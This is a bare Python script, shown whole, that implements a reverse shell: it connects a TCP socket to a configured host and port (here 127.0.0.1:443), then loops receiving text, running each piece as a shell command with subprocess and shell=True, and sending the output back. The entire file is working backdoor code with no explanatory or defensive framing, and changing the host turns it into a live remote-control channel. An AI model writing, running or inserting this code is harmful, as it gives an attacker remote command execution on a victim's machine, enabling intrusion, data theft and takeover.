#!/usr/bin/python
import socket
import subprocess

HOST = '127.0.0.1'    
PORT = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
while 1:
	data = s.recv(1024)
	proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	stdout_value = proc.stdout.read() + proc.stderr.read()
	s.send(stdout_value)
s.close()
